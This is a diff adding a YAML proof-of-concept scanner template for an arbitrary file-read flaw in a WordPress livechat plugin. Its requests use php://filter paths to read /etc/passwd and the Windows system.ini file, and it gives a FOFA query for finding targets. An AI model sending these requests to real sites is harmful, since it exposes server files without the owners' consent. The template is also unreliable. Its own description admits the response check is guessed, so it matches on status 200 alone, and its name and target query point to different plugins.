@@ -1,0 +1,28 @@
+id: poc-fpapamg42velcalu
+info:
+  name: wordpress-plugin-livechat任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fpapamg42velcalu
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fpapamg42velcalu
+    fofa: body="wp-content/plugins/Membership"
+http:
+- raw:
+  - GET /?path=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - GET /?path=php://filter/convert.base64-encode/resource=C:\Windows\system.ini HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
